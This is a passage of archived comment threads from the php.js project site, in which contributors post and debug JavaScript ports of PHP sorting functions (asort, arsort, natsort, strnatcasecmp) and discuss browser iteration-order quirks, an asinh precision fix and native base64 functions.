= 0;\r\n    \r\n    for (k in inputArr) { \/\/ Get key and value arrays\r\n        valArr.push(inputArr[k]);\r\n        delete inputArr[k] ;\r\n    }\r\n\t\r\n\tswitch (sort_flags) {\r\n\t\tcase 'SORT_STRING': \/\/ compare items as strings\r\n\t\tcase 'SORT_LOCALE_STRING': \/\/ compare items as strings, based on the current locale (set with  i18n_loc_set_default() as of PHP6)\r\n\t\t\tthrow 'Not implemented yet';\r\n\t\tcase 'SORT_NUMERIC': \/\/ compare items numerically\r\n\t\t\tsorter = function (a, b) {\r\n\t\t\t\treturn(a - b);\r\n\t\t\t};\r\n\t\t\tbreak;\r\n\t\tcase 'SORT_REGULAR': \/\/ compare items normally (don't change types)\r\n\t\tdefault:\r\n\t\t\tsorter = function (a, b) {\r\n\t\t\t\tif (a &gt; b)\r\n\t\t\t\t\treturn 1;\r\n\t\t\t\tif (a &lt; b)\r\n\t\t\t\t\treturn -1;\r\n\t\t\t\treturn 0;\r\n\t\t\t};\r\n\t\t\tbreak;\r\n\t}\r\n    valArr.sort(sorter);\r\n \r\n    for (i = 0; i &lt; valArr.length; i++) { \/\/ Repopulate the old array\r\n        inputArr[i] = valArr[i];\r\n    }\r\n    return true;\r\n}\r\n\r\n\r\nfunction rsort (inputArr, sort_flags) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: Kevin van Zonneveld (http:\/\/kevin.vanzonneveld.net)\r\n    \/\/ +    revised by: Brett Zamir\r\n    \/\/ *     example 1: rsort(['Kevin', 'van', 'Zonneveld']);\r\n    \/\/ *     returns 1: true\r\n    \/\/ *     example 2: fruits = {d: 'lemon', a: 'orange', b: 'banana', c: 'apple'};\r\n    \/\/ *     example 2: rsort(fruits);\r\n    \/\/ *     returns 2: true\r\n    \/\/ *     results 2: fruits == {0: 'orange', 1: 'lemon', 2: 'banana', 3: 'apple'}\r\n \r\n    var valArr = [], keyArr=[];\r\n    var k = '', i = 0;\r\n    \r\n    for (k in inputArr) { \/\/ Get key and value arrays\r\n        valArr.push(inputArr[k]);\r\n        delete inputArr[k] ;\r\n    }\r\n \r\n    switch (sort_flags) {\r\n\t\tcase 'SORT_STRING': \/\/ compare items as strings\r\n\t\tcase 'SORT_LOCALE_STRING': \/\/ compare items as strings, based on the current locale (set with  i18n_loc_set_default() as of PHP6)\r\n\t\t\tthrow 'Not implemented yet';\r\n\t\tcase 'SORT_NUMERIC': \/\/ compare items numerically\r\n\t\t\tsorter = function (a, b) {\r\n\t\t\t\treturn(b - a);\r\n\t\t\t};\r\n\t\t\tbreak;\r\n\t\tcase 'SORT_REGULAR': \/\/ compare items normally (don't change types)\r\n\t\tdefault:\r\n\t\t\tsorter = function (a, b) {\r\n\t\t\t\tif (a &lt; b)\r\n\t\t\t\t\treturn 1;\r\n\t\t\t\tif (a &gt; b)\r\n\t\t\t\t\treturn -1;\r\n\t\t\t\treturn 0;\r\n\t\t\t};\r\n\t\t\tbreak;\r\n\t}\r\n    valArr.sort(sorter);\r\n \r\n    for (i = 0; i &lt; valArr.length; i++) { \/\/ Repopulate the old array\r\n        inputArr[i] = valArr[i];\r\n    }\r\n    return true;\r\n}\r\n[\/CODE]"},{"date":"2009-01-17 06:01:49","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Sorry... the sort() and rsort() I just updated can be used, but asort() needs to be fixed to the following, and I forgot arsort():\r\n\r\nfunction asort(inputArr, sort_flags) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: Brett Zamir\r\n    \/\/ %          note: The examples are correct, this is a new way\r\n    \/\/ %          note: Credits to: http:\/\/javascript.internet.com\/math-related\/bubble-sort.html \r\n    \/\/ *     example 1: data = {d: 'lemon', a: 'orange', b: 'banana', c: 'apple'};\r\n    \/\/ *     example 1: asort(data);\r\n    \/\/ *     results 1: data == {c: 'apple', b: 'banana', d: 'lemon', a: 'orange'}\r\n    \/\/ *     returns 1: true\r\n\t\r\n\tvar valArr=[], keyArr=[], k, i, ret, sorter;\r\n\r\n\tswitch (sort_flags) {\r\n\t\tcase 'SORT_STRING': \/\/ compare items as strings\r\n\t\tcase 'SORT_LOCALE_STRING': \/\/ compare items as strings, based on the current locale (set with  i18n_loc_set_default() as of PHP6)\r\n\t\t\tthrow 'Not implemented yet';\r\n\t\tcase 'SORT_NUMERIC': \/\/ compare items numerically\r\n\t\t\tsorter = function (a, b) {\r\n\t\t\t\treturn(a - b);\r\n\t\t\t};\r\n\t\t\tbreak;\r\n\t\tcase 'SORT_REGULAR': \/\/ compare items normally (don't change types)\r\n\t\tdefault:\r\n\t\t\tsorter = function (a, b) {\r\n\t\t\t\tif (a &gt; b)\r\n\t\t\t\t\treturn 1;\r\n\t\t\t\tif (a &lt; b)\r\n\t\t\t\t\treturn -1;\r\n\t\t\t\treturn 0;\r\n\t\t\t};\r\n\t\t\tbreak;\r\n\t}\r\n\r\n    var bubbleSort = function(keyArr, inputArr) {\r\n        var i, j, tempValue, tempKeyVal;\r\n        for (i = inputArr.length-2; i &gt;= 0; i--) {\r\n            for (j = 0; j &lt;= i; j++) {\r\n                ret = sorter(inputArr[j+1], inputArr[j]);\r\n                if (ret &lt; 0) {\r\n                    tempValue     = inputArr[j];\r\n                    inputArr[j]   = inputArr[j+1];\r\n                    inputArr[j+1] = tempValue;\r\n                    tempKeyVal    = keyArr[j];\r\n                    keyArr[j]     = keyArr[j+1];\r\n                    keyArr[j+1]   = tempKeyVal;\r\n                }\r\n            }\r\n        }\r\n    };\r\n  \r\n    \/\/ Get key and value arrays\r\n    for (k in inputArr) { \r\n        valArr.push(inputArr[k]);\r\n        keyArr.push(k);\r\n        delete inputArr[k] ;\r\n    }\r\n    try {\r\n        \/\/ Sort our new temporary arrays\r\n        bubbleSort(keyArr, valArr); \r\n    } catch(e) {\r\n        return false;\r\n    }\r\n \r\n    \/\/ Repopulate the old array\r\n    for (i = 0; i &lt; valArr.length; i++) {  \r\n        inputArr[keyArr[i]] = valArr[i];\r\n    }\r\n    \r\n    return true;\r\n}\r\n\r\nfunction arsort(inputArr, sort_flags) {\r\n    \/\/ http:\/\/kevin.vanzonneveld.net\r\n    \/\/ +   original by: Brett Zamir\r\n    \/\/ %          note: The examples are correct, this is a new way\r\n    \/\/ %          note: Credits to: http:\/\/javascript.internet.com\/math-related\/bubble-sort.html \r\n    \/\/ *     example 1: data = {d: 'lemon', a: 'orange', b: 'banana', c: 'apple'};\r\n    \/\/ *     example 1: asort(data);\r\n    \/\/ *     results 1: data == {c: 'apple', b: 'banana', d: 'lemon', a: 'orange'}\r\n    \/\/ *     returns 1: true\r\n\t\r\n\tvar valArr=[], keyArr=[], k, i, ret, sorter;\r\n\r\n\tswitch (sort_flags) {\r\n\t\tcase 'SORT_STRING': \/\/ compare items as strings\r\n\t\tcase 'SORT_LOCALE_STRING': \/\/ compare items as strings, based on the current locale (set with  i18n_loc_set_default() as of PHP6)\r\n\t\t\tthrow 'Not implemented yet';\r\n\t\tcase 'SORT_NUMERIC': \/\/ compare items numerically\r\n\t\t\tsorter = function (a, b) {\r\n\t\t\t\treturn(a - b);\r\n\t\t\t};\r\n\t\t\tbreak;\r\n\t\tcase 'SORT_REGULAR': \/\/ compare items normally (don't change types)\r\n\t\tdefault:\r\n\t\t\tsorter = function (a, b) {\r\n\t\t\t\tif (a &gt; b)\r\n\t\t\t\t\treturn 1;\r\n\t\t\t\tif (a &lt; b)\r\n\t\t\t\t\treturn -1;\r\n\t\t\t\treturn 0;\r\n\t\t\t};\r\n\t\t\tbreak;\r\n\t}\r\n\r\n    var bubbleSort = function(keyArr, inputArr) {\r\n        var i, j, tempValue, tempKeyVal;\r\n        for (i = inputArr.length-2; i &gt;= 0; i--) {\r\n            for (j = 0; j &lt;= i; j++) {\r\n                ret = sorter(inputArr[j+1], inputArr[j]);\r\n                if (ret &gt; 0) {\r\n                    tempValue     = inputArr[j];\r\n                    inputArr[j]   = inputArr[j+1];\r\n                    inputArr[j+1] = tempValue;\r\n                    tempKeyVal    = keyArr[j];\r\n                    keyArr[j]     = keyArr[j+1];\r\n                    keyArr[j+1]   = tempKeyVal;\r\n                }\r\n            }\r\n        }\r\n    };\r\n  \r\n    \/\/ Get key and value arrays\r\n    for (k in inputArr) { \r\n        valArr.push(inputArr[k]);\r\n        keyArr.push(k);\r\n        delete inputArr[k] ;\r\n    }\r\n    try {\r\n        \/\/ Sort our new temporary arrays\r\n        bubbleSort(keyArr, valArr); \r\n    } catch(e) {\r\n        return false;\r\n    }\r\n \r\n    \/\/ Repopulate the old array\r\n    for (i = 0; i &lt; valArr.length; i++) {  \r\n        inputArr[keyArr[i]] = valArr[i];\r\n    }\r\n    \r\n    return true;\r\n}\r\n\r\n[\/CODE]"},{"date":"2009-01-17 13:48:27","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Wicked!"},{"date":"2009-01-18 03:05:48","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Sorry, in rsort(), I neglected to add a variable declaration for 'sorter' at the top, so it is a global now.\r\n\r\nOn the good side, I figured out there is an easy way to get to sort by the locale, though there's apparently no way in regular JavaScript to change the locale, as there is in PHP.\r\n\r\nYou can replace the SORT_STRING and SORT_LOCALE_STRING in all sort functions (except for usort, uksort, uasort which don't have them) now with the following:\r\n\r\n(for krsort and rsort only:)\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n\t\tcase 'SORT_STRING': \/\/ compare items as strings\r\n\t\t\tthrow 'Not implemented yet';\r\n\t\tcase 'SORT_LOCALE_STRING': \/\/ compare items as strings, based on the current locale\r\n\t\t\tsorter = function (a, b) {\r\n\t\t\t\treturn(b.localeCompare(a));\r\n\t\t\t};\r\n\t\t\tbreak;\r\n[\/CODE]\r\n\r\nFor asort, arsort, ksort, and sort:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n\t\tcase 'SORT_STRING': \/\/ compare items as strings\r\n\t\t\tthrow 'Not implemented yet';\r\n\t\tcase 'SORT_LOCALE_STRING': \/\/ compare items as strings, based on the current locale\r\n\t\t\tsorter = function (a, b) {\r\n\t\t\t\treturn(a.localeCompare(b));\r\n\t\t\t};\r\n\t\t\tbreak;\r\n[\/CODE]"},{"date":"2009-01-22 12:59:37","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Now the sorting functions can be made complete with my submissions below (and its dependency on strnatcmp--thanks Onno!) and with with SORT_LOCALE patches in my earlier comment:\r\n\r\nFor asort, arsort, ksort, and sort\u00ef\u00bc\u0161\r\n\r\n    switch (sort_flags) {\r\n        case 'SORT_STRING': \/\/ compare items as strings\r\n            sorter = strnatcmp;\r\n            break;\r\n\r\nor in the case of\u00e3\u20ac\u20ackrsort and rsort\r\n\r\n[CODE=&quot;Javascript&quot;]    switch (sort_flags) {\r\n        case 'SORT_STRING': \/\/ compare items as strings\r\n            sorter = function (a,b) {\r\n                    return strnatcmp(b,a);\r\n            }\r\n            break;[\/CODE]\r\n\r\nFYI, PHP's own algorithm for sorting naturally is available in a JavaScript function (but not a case-sensitive version) at http:\/\/sourcefrog.net\/projects\/natsort\/natcompare.js . I presume yours is just as good, Onno, and seems to work just fine, but for your reference, it's there in case you think you may have missed something.\r\n\r\nWe can also get natsort as a derivative of asort, also using strnatcmp (but don't be thrown off by the fact that this function (and natcasesort discussed below) are supposed to preserve keys, and as such won't be able to make a difference with JavaScript arrays as they are expected to be passed by reference--but they will work with ).\r\n\r\nThe following depends on strnatcmp which depends on strcmp:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n$array1 = {a:&quot;img12.png&quot;, b:&quot;img10.png&quot;, c:&quot;img2.png&quot;, d:&quot;img1.png&quot;};\r\nnatsort($array1);\r\n\/*\r\nd: img1.png\r\nc: img2.png\r\nb: img10.png\r\na: img12.png\r\n*\/\r\n\r\n\r\nfunction natsort(inputArr) { \r\n    var valArr=[], keyArr=[], k, i, ret;\r\n  \r\n    var bubbleSort = function(keyArr, inputArr) {\r\n        var i, j, tempValue, tempKeyVal;\r\n        for (i = inputArr.length-2; i &gt;= 0; i--) {\r\n            for (j = 0; j &lt;= i; j++) {\r\n                ret = strnatcmp(inputArr[j+1], inputArr[j]);\r\n                if (ret &lt; 0) {\r\n                    tempValue = inputArr[j];\r\n                    inputArr[j] = inputArr[j+1];\r\n                    inputArr[j+1] = tempValue;\r\n                    tempKeyVal = keyArr[j];\r\n                    keyArr[j] = keyArr[j+1];\r\n                    keyArr[j+1] = tempKeyVal;\r\n                }\r\n            }\r\n        }\r\n    };\r\n \r\n    \/\/ Get key and value arrays\r\n    for (k in inputArr) {\r\n        valArr.push(inputArr[k]);\r\n        keyArr.push(k);\r\n        delete inputArr[k] ;\r\n    }\r\n    try {\r\n        \/\/ Sort our new temporary arrays\r\n        bubbleSort(keyArr, valArr);\r\n    } catch(e) {\r\n        return false;\r\n    }\r\n \r\n    \/\/ Repopulate the old array\r\n    for (i = 0; i &lt; valArr.length; i++) {\r\n        inputArr[keyArr[i]] = valArr[i];\r\n    }\r\n \r\n    return true;\r\n}\r\n[\/CODE]\r\n\r\nNow I'm fairly certain natcasesort should work as follows, but I believe there must be a bug in strncasecmp (which returns 0 at each iteration), since it isn't working:\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n$array1 = {a:'IMG0.png', b:'img12.png', c:'img10.png', d:'img2.png', e:'img1.png', f:'IMG3.png'}; \r\nnatcasesort($array1);\r\n\/* Should be:\r\n    0: IMG0.png\r\n    4: img1.png\r\n    3: img2.png\r\n    5: IMG3.png\r\n    2: img10.png\r\n    1: img12.png\r\n*\/\r\n\r\n\/\/ Depends on strncasecmp\r\nfunction natcasesort(inputArr) { \r\n    var valArr=[], keyArr=[], k, i, ret;\r\n  \r\n    var bubbleSort = function(keyArr, inputArr) {\r\n        var i, j, tempValue, tempKeyVal;\r\n        for (i = inputArr.length-2; i &gt;= 0; i--) {\r\n            for (j = 0; j &lt;= i; j++) {\r\n                ret = strncasecmp(inputArr[j+1], inputArr[j]);\r\n                if (ret &lt; 0) {\r\n                    tempValue = inputArr[j];\r\n                    inputArr[j] = inputArr[j+1];\r\n                    inputArr[j+1] = tempValue;\r\n                    tempKeyVal = keyArr[j];\r\n                    keyArr[j] = keyArr[j+1];\r\n                    keyArr[j+1] = tempKeyVal;\r\n                }\r\n            }\r\n        }\r\n    };\r\n \r\n    \/\/ Get key and value arrays\r\n    for (k in inputArr) {\r\n        valArr.push(inputArr[k]);\r\n        keyArr.push(k);\r\n        delete inputArr[k] ;\r\n    }\r\n    try {\r\n        \/\/ Sort our new temporary arrays\r\n        bubbleSort(keyArr, valArr);\r\n    } catch(e) {\r\n        return false;\r\n    }\r\n \r\n    \/\/ Repopulate the old array\r\n    for (i = 0; i &lt; valArr.length; i++) {\r\n        inputArr[keyArr[i]] = valArr[i];\r\n    }\r\n \r\n    return true;\r\n}\r\n[\/CODE]"},{"date":"2009-01-22 13:10:05","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"array_multisort is the only other array function left... (though some other array functions still have to support objects and maybe they need to be reviewed for missing features)..."},{"date":"2009-01-22 13:12:54","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Sorry, actually my fault.... natcasesort should include strnatcasecmp (which isn't implemented yet) instead of strncasecmp... Then that one should work... :)"},{"date":"2009-01-22 13:36:16","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Ok, now here it is... here's strnatcasecmp and natcasesort (revised to call the former) with an example demonstration. This is based on the algorithm used by PHP, and the strnatcasecmp should include all of the credits\/license at http:\/\/sourcefrog.net\/projects\/natsort\/natcompare.js (I changed it slightly, just changing to lower case for case-insensitive comparison and shortening parts of the rest of the code somewhat\r\n\r\n[CODE=&quot;Javascript&quot;]\r\n$array1 = {0:'IMG0.png', 1:'img12.png', 2:'img10.png', 3:'img2.png', 4:'img1.png', 5:'IMG3.png'}; \r\n\r\nnatcasesort($array1);\r\nwhatIs($array1)\r\n\/* Should be:\r\n    0: IMG0.png\r\n    4: img1.png\r\n    3: img2.png\r\n    5: IMG3.png\r\n    2: img10.png\r\n    1: img12.png\r\n*\/\r\n \r\n\/\/ Depends on strncasecmp\r\nfunction natcasesort(inputArr) { \r\n    var valArr=[], keyArr=[], k, i, ret;\r\n  \r\n    var bubbleSort = function(keyArr, inputArr) {\r\n        var i, j, tempValue, tempKeyVal;\r\n        for (i = inputArr.length-2; i &gt;= 0; i--) {\r\n            for (j = 0; j &lt;= i; j++) {\r\n                ret = strnatcasecmp(inputArr[j+1], inputArr[j]);\r\n                if (ret &lt; 0) {\r\n                    tempValue = inputArr[j];\r\n                    inputArr[j] = inputArr[j+1];\r\n                    inputArr[j+1] = tempValue;\r\n                    tempKeyVal = keyArr[j];\r\n                    keyArr[j] = keyArr[j+1];\r\n                    keyArr[j+1] = tempKeyVal;\r\n                }\r\n            }\r\n        }\r\n    };\r\n \r\n    \/\/ Get key and value arrays\r\n    for (k in inputArr) {\r\n        valArr.push(inputArr[k]);\r\n        keyArr.push(k);\r\n        delete inputArr[k] ;\r\n    }\r\n    try {\r\n        \/\/ Sort our new temporary arrays\r\n        bubbleSort(keyArr, valArr);\r\n    } catch(e) {\r\n        return false;\r\n    }\r\n \r\n    \/\/ Repopulate the old array\r\n    for (i = 0; i &lt; valArr.length; i++) {\r\n        inputArr[keyArr[i]] = valArr[i];\r\n    }\r\n \r\n    return true;\r\n}\r\nfunction strnatcasecmp(a,b) {\r\n\ta = a.toLowerCase();\r\n\tb = b.toLowerCase();\r\n\r\n\tfunction isWhitespaceChar(a) {\r\n\t\treturn a.charCodeAt(0) &lt;= 32;\r\n\t}\r\n\r\n\tfunction isDigitChar(a) {\r\n\t\tvar charCode = a.charCodeAt(0);\r\n\t\treturn ( charCode &gt;= 48  &amp;&amp; charCode &lt;= 57 );\r\n\t}\r\n\r\n\tfunction compareRight(a,b) {\r\n\t\tvar bias = 0;\r\n\t\tvar ia = 0;\r\n\t\tvar ib = 0;\r\n\r\n\t\tvar ca;\r\n\t\tvar cb;\r\n\r\n\t\t\/\/ The longest run of digits wins.  That aside, the greatest\r\n\t\t\/\/ value wins, but we can't know that it will until we've scanned\r\n\t\t\/\/ both numbers to know that they have the same magnitude, so we\r\n\t\t\/\/ remember it in BIAS.\r\n\t\tfor (;; ia++, ib++) {\r\n\t\t\tca = a.charAt(ia);\r\n\t\t\tcb = b.charAt(ib);\r\n\r\n\t\t\tif (!isDigitChar(ca)\r\n\t\t\t\t\t&amp;&amp; !isDigitChar(cb)) {\r\n\t\t\t\treturn bias;\r\n\t\t\t} else if (!isDigitChar(ca)) {\r\n\t\t\t\treturn -1;\r\n\t\t\t} else if (!isDigitChar(cb)) {\r\n\t\t\t\treturn +1;\r\n\t\t\t} else if (ca &lt; cb) {\r\n\t\t\t\tif (bias == 0) {\r\n\t\t\t\t\tbias = -1;\r\n\t\t\t\t}\r\n\t\t\t} else if (ca &gt; cb) {\r\n\t\t\t\tif (bias == 0)\r\n\t\t\t\t\tbias = +1;\r\n\t\t\t} else if (ca == 0 &amp;&amp; cb == 0) {\r\n\t\t\t\treturn bias;\r\n\t\t\t}\r\n\t\t}\r\n\t}\r\n\r\n    var ia = 0, ib = 0;\r\n\tvar nza = 0, nzb = 0;\r\n\tvar ca, cb;\r\n\tvar result;\r\n\r\n    while (true) {\r\n        \/\/ only count the number of zeroes leading the last number compared\r\n        nza = nzb = 0;\r\n\r\n        ca = a.charAt(ia);\r\n        cb = b.charAt(ib);\r\n\r\n        \/\/ skip over leading spaces or zeros\r\n        while ( isWhitespaceChar( ca ) || ca =='0' ) {\r\n            if (ca == '0') {\r\n                nza++;\r\n            } else {\r\n                \/\/ only count consecutive zeroes\r\n                nza = 0;\r\n            }\r\n\r\n            ca = a.charAt(++ia);\r\n        }\r\n\r\n        while ( isWhitespaceChar( cb ) || cb == '0') {\r\n            if (cb == '0') {\r\n                nzb++;\r\n            } else {\r\n                \/\/ only count consecutive zeroes\r\n                nzb = 0;\r\n            }\r\n\r\n            cb = b.charAt(++ib);\r\n        }\r\n\r\n        \/\/ process run of digits\r\n        if (isDigitChar(ca) &amp;&amp; isDigitChar(cb)) {\r\n            if ((result = compareRight(a.substring(ia), b.substring(ib))) != 0) {\r\n                return result;\r\n            }\r\n        }\r\n\r\n        if (ca == 0 &amp;&amp; cb == 0) {\r\n            \/\/ The strings compare the same.  Perhaps the caller\r\n            \/\/ will want to call strcmp to break the tie.\r\n            return nza - nzb;\r\n        }\r\n\r\n        if (ca &lt; cb) {\r\n            return -1;\r\n        } else if (ca &gt; cb) {\r\n            return +1;\r\n        }\r\n\r\n        ++ia; ++ib;\r\n    }\r\n}\r\n[\/CODE]"},{"date":"2009-01-25 13:35:15","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: Wow. Amazing work again Brett, you're an unstoppable force.\r\n\r\nAbout strnatcasecmp:\r\nI copied the full list of names for credits. The disclaimer part of the license is already covered by PHP.JS' license, I think. I made a minor change which I think will prevent the arguments to be overwritten.\r\n\r\nEverything else is just added, tested and just plain awesome."},{"date":"2010-10-13 15:03:10","author":"Tom","url":"http:\/\/imp.airy.me","comment":"Doesn't work in Chrome 6"},{"date":"2010-10-13 15:45:38","author":"Tom","url":"http:\/\/imp.airy.me","comment":"http:\/\/jsfiddle.net\/kolor\/Nt39S\/\n\nsome browsers dont allow custom ordering of array elements"},{"date":"2010-10-18 18:08:57","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Tom: Thanks for pointing that out... For Chrome,  http:\/\/code.google.com\/p\/v8\/issues\/detail?id=164 but it seems browsers are rushing for speed over developer convenience, esp. with, as I recall, Microsoft not willing to allow a fixed iteration order into ECMAScript (their iteration order is apparently predictable until you try deleting properties).  \n\nBut we do need a note there for sure--and I think Kevin, we ought to consider supporting (maybe via ini_set) an alternative \"associative array\" structure, such as \"[{key1:val1}, {key2:val2}]\", as awkward, cumbersome and annoying as it is. Support for such a structure should be useful in itself, not to mention provide predictable cross-browser support for these functions."}],"asinh":[{"date":"2011-07-20 03:45:02","author":"Mike Speciner","url":"","comment":"This does not work for negative arg. It also suffers from poor precision for |arg| << 1.\n\nTo fix the first problem, try\nreturn Math.log(Math.abs(arg) + Math.sqrt(arg * arg + 1))*(arg<0?-1:1);\n\nThe second problem is much harder to fix; best might be a rational function approximation for small args.\nIf there were a builtin function log1p(x) := log(1+x), and similarly\nexpm1(x) := exp(x)-1, things would be much simpler for all the hyperbolic functions and their inverses."}],"asort":[{"date":"2009-01-14 22:50:10","author":"Jason","url":"","comment":"Great work!  This should be very useful."},{"date":"2009-01-15 00:55:29","author":"Brett Zamir","url":"http:\/\/bahai-library.com","comment":"Glad you liked it, Jason.\r\n\r\nThat reminds me, I should give some credit for this function (and for arsort() too) to http:\/\/javascriptsource.com (specifically http:\/\/javascript.internet.com\/math-related\/bubble-sort.html ). They stated &quot;the script is yours&quot; (and my version is reasonably altered anyways), but they deserve some credit.\r\n\r\nKevin, a small thing, but if you were attending to these kinds of things, I should have put a semicolon after &quot;var bubbleSort .... {...}&quot; (or used regular function notation)."},{"date":"2009-01-15 11:27:50","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ Brett Zamir: fixed"},{"date":"2009-11-17 20:05:04","author":"paulo kuong","url":"","comment":"Doesn't work in IE"},{"date":"2009-11-18 06:11:46","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@paulo kuong: Darn, you're right!  You can see how the array forms by adding our var_dump (with echo() dependency) after line 82 :\n\n[CODE]var_dump(inputArr);echo('<br \/>');[\/CODE]\n\nIE does preserve the right order as it goes through the for loop, but it seems to remember its previous order (since I see no other good explanation why it puts it back in exactly that non-alphabetical\/non-reverse-alphabetical order)--no matter whether I delete (as we do now), set to undefined or some value and then delete, etc.\n\nNevertheless, everyone from Chrome, Opera, Safari, to Firefox handle this consistently.\n\nHas anyone heard of this issue in IE before and any ways to get around it?"},{"date":"2009-11-18 06:13:36","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"That echo() was supposed to have a br line break in it but the form stripped the element out (seems the colorer is using strip_tags() instead of htmlentities())..."},{"date":"2009-12-07 15:03:30","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Paulo Kuong: I have now fixed the function (and all others like it except for array_multisort which still needs to be fixed and array_unique which hasn't implemented its sorting argument at all yet) to return a (shallow) copy of the array unless the user does \"ini_set('phpjs.strictForIn', true);\" in which case it will attempt to work by reference (assumes an exclusively non-IE environment!)."},{"date":"2010-05-03 17:57:26","author":"Adam Wallner","url":"http:\/\/web2.bitbaro.hu\/","comment":"It doesn't work in Firefox 3.6 (I haven't tested in other browsers, I need it only in firefox). The problem is in js you don't have associative arrays only objects.\n\nWorkaround: change the \n[CODE]\npopulateArr = []\n[\/CODE]\nto\n[CODE]\npopulateArr = {}\n[\/CODE]\nin the first line."},{"date":"2010-05-03 21:32:06","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Adam Wallner: Argh...Yes, you are right, and that was what I originally meant to do...Very glad you found that since it affected a good number of functions (though thankfully, fewer people probably using that option--still...). Now fixed in Git... Thank you..."},{"date":"2010-05-03 21:34:10","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"@Adam Wallner: I see now I hadn't looked carefully; I see that it was actually messed up for the more common use case. Oh, that is annoying, but glad it is now fixed."},{"date":"2011-04-13 20:53:02","author":"Tom","url":"www.binde.lv","comment":"This is not working on Chrome. Objects are not specified as having to return properties in any particular order.\nMore info here: http:\/\/code.google.com\/p\/chromium\/issues\/detail?id=883"},{"date":"2011-04-14 13:52:10","author":"Brett Zamir","url":"http:\/\/brett-zamir.me","comment":"Yes, Tom, thanks. We're aware of the issue, and since Chrome might not address this issue, given that the ECMAScript specification indeed does state that the iteration order is in fact implementation dependent (though it's worked pretty well to date with a minor exception before Chrome changed the behavior), I'm doing initial work now (see the array() function) on supporting an associative array representation which is slightly more cumbersome (unfortunately necessarily so). Feel free to help out--great way to learn some more JavaScript or at least do a little brain puzzles....Lots of array functions to port...\n\nSo, to ensure order is predictable cross-browser, you would use something like this:   \n\n[CODE]\n\/\/ Returns a PHPJS_Array object--our own class which can\n\/\/ have all the same PHP methods on it, but using a chainable \n\/\/ style, and ensuring sequence is preserved\nvar arr = array({key1:value1}, {key2:value2});\n[\/CODE]\n\nNote that this would be treated as an associative array a single level deep (i.e., it would actually be treated like {key1:value1, key2:value2}). \n\nOr, once I finish updating the array_merge() implementation to work on PHPJS_Array, you could import arrays or objects too, bearing in mind that you'd have to first perform a sort in order to guarantee order:\n\n[CODE]\nvar arr = array().merge({key1:value1, key2:value2}).sort(); \/\/ After the sort, we would have a reliable fixed order\n[\/CODE]\n\nOn the bright side, one benefit of moving to this model is that it is forcing us to implement what has been a goal for some time: a jQuery-like chainable object which would allow us to do such as:\n\n[CODE]\narr.sort().change_key_case('UPPER_CASE').values(); \/\/ Notice \"array_\" is removed from \"array_values\" since we know the object is an array.\n[\/CODE]\n\nWe should also be able to do the like for strings, etc.:\n\n[CODE]\nstring(user_input).str_replace(...).strip_tags().rev(); \/\/ I didn't remove \"str_\" from \"str_replace\" to avoid conflict with the built-in replace() method.\n[\/CODE]\n\nBesides this syntax being more \"JavaScript-like\" and favorable to some JavaScript users, perhaps because it avoids one needing to go backwards to add parentheses around a sequence--you just keep adding to the right instead--it also addresses some of the objections to PHP's API in not having predictable argument order--there's no need to remember needle-haystack for example, because the haystack argument will be eliminated, as it will be assumed to be the object on which we are calling methods.\n\nSome libraries like Underscore.js already offer some of these abilities, and maybe offer some innovations not present in PHP, but the PHP library is both familiar in naming to PHP users, as well as quite rich, so hopefully this may bring our library into wider favor among regular JavaScript users, as well as continue to provide convenience for PHP users moving to JavaScript (as well as give piece of mind for this implementation order issue). Thanks for bringing this up!"},{"date":"2012-02-18 21:31:24","author":"Conix Inc","url":"www.conixinc.com","comment":"i want to use it"}],"base64_decode":[{"date":"2008-04-08 19:15:46","author":"TXGruppi","url":"","comment":"Reading the functions I found the base64_encode and base64_decode in a way very complicated.\r\n\r\nThere are the functions btoa and atob in JavaScript that make this conversion.\r\n\r\n[CODE=&quot;Javascript&quot;]\r\nvar name = 'JavaScript';\r\nvar enc = btoa(name);\r\nvar dec = atob(enc);\r\nalert(name); \/\/ JavaScript\r\nalert(enc); \/\/ SmF2YVNjcmlwdA==\r\nalert(dec); \/\/ JavaScript\r\n[\/CODE]\r\n\r\nAny questions send me an email: txgruppi@gmail.com\r\n\r\nTranslated by: Google Translator"},{"date":"2008-04-23 21:33:45","author":"TXGruppi","url":"","comment":"I did a test in IE and not worked the functions atob and btoa, for this reason I did another test to measure the speed of implementation of tasks in Firefox and Internet Explorer. In a loop see that in the FF functions atob and btoa are faster than the functions base64_decode and base64_encode.\r\n\r\nThe test is available in http:\/\/www.txgruppi.com\/base64.html\r\n\r\nIf you can send me your e-mail, I would like to discuss some issues about things I liked in your site.\r\n\r\n* Address of my future site.\r\n\r\nAny questions send me an email: txgruppi@gmail.com Translated by: Google Translator"},{"date":"2008-04-25 11:04:48","author":"Kevin van Zonneveld","url":"http:\/\/kevin.vanzonneveld.net","comment":"@ TXGruppi: I've added a:\r\n[CODE=&quot;Javascript&quot;]\r\n    \/\/ mozilla has this native\r\n    if (typeof window['atob'] == 'function') {\r\n        return atob(data);\r\n    }\r\n[\/CODE]\r\nTo make use of mozilla's native base64 functions."},{"date":"2008-05-08 01:44:22","author":"Aman Gupta","url":"","comment":"This implementation is extremely slow in IE due to string concatenation. It is much faster to push onto an array and return array.join('').\r\n\r\nIn firefox, window.atob works for decoding as long as you don't pass in a large string. Over 